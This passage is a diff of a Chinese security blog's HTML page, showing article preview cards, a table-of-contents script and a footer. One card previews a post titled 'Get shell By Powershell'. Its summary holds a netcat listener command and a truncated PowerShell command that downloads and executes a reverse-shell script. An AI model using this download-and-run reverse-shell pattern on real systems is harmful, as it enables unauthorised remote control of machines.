+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Get shell By Powershell">
+                        
+                        <span class="card-title">Get shell By Powershell</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">Invoke-PowerShellTcp.ps1监听：nc -nv -l -p 9999
+目标执行：
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).Downl</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-08-30
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/攻防渗透/" class="post-category" target="_blank">
+                                    攻防渗透
+                                </a>
+                            
+                            <a href="/categories/攻防渗透/程序代码/" class="post-category" target="_blank">
+                                    程序代码
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/powershell/" target="_blank">
+                        <span class="chip bg-color">powershell</span>
+                    </a>
+                    
+                    <a href="/tags/命令执行/" target="_blank">
+                        <span class="chip bg-color">命令执行</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">下一篇</div>
+            <div class="card">
+                <a href="/2017/06/16/gong-ji-liu-liang-de-qing-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="攻击流量的清洗">
+                        
+                        <span class="card-title">攻击流量的清洗</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2017-06-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/安全建设/" class="post-category" target="_blank">
+                                    安全建设
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/DDOS/" target="_blank">
+                        <span class="chip bg-color">DDOS</span>
+                    </a>
+                    
+                    <a href="/tags/IDS/" target="_blank">
+                        <span class="chip bg-color">IDS</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title">目录</div>
+            <div id="toc-content">
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+       <div class="col s12 m8 l8 copy-right">
+            copyright &copy; <a href="https://ssooking.github.io/" target="_blank">ssooking</a>. 关注安全动态，分享优质文章！
+        </div>
+
+        <div class="col s12 m4 l4 social-link"><a href="https://github.com/ssooking" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:ssooking@yeah.net" class="tooltipped" target="_blank" data-tooltip="mail：ssooking@yeah.net" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="wechat: licg18238296977" data-position="top" data-delay="50">
+    <i class="fa fa-wechat"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="QQ: 1652010949" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+
+<a href="https://join.skype.com/invite/PWgoTe4YvrbH" class="tooltipped" target="_blank" data-tooltip="skype：ssooking" data-position="top" data-delay="50">
+    <i class="fa fa-skype"></i>
+</a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input" autofocus>
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+</body>
+</html>
